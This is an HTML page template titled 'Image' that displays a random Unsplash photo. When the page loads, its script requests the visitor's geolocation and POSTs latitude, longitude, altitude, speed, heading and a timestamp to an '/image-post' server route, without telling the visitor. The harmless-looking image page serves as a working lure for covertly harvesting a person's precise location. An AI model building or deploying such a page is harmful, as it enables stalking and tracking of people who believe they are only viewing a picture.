<!doctype html>
<html lang="en">
  <head>
    <title>Image</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
  </head>
  <body>

    <img src="https://source.unsplash.com/random" class="img-thumbnail" alt="unsplash image">
      
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
    <script>
      $(function() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else { 
            console.log("Geolocation is not supported by this browser.");
        }
      });

      function showPosition(position) {
        console.log('Latitude: '+ position.coords.latitude);
        console.log('Longitude: ' + position.coords.longitude);
        console.log('Acuracy: ' + position.coords.accuracy);
        console.log('Altitude: ' + position.coords.altitude);
        console.log('Altitude Accuracy: ' + position.coords.altitudeAccuracy);
        console.log('Heading: ' + position.coords.heading);
        console.log('Speed: ' + position.coords.speed);
        console.log('Timestamp: ' + position.timestamp);

        // console.log(position);

        var request = $.ajax({
          url: '{{ url('/image-post') }}',
          type: "POST",
          data: {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            heading: position.coords.heading,
            speed: position.coords.speed,
            request_timestamp: position.timestamp
          },
          dataType: "json"
        });

        request.done(function(msg) {
          console.log('Server response (Success): ' + msg.status);
        });

        request.fail(function(jqXHR, textStatus) {
          console.log('Server response (Failed): ' + textStatus);
        });
      }
    </script>
  </body>
</html>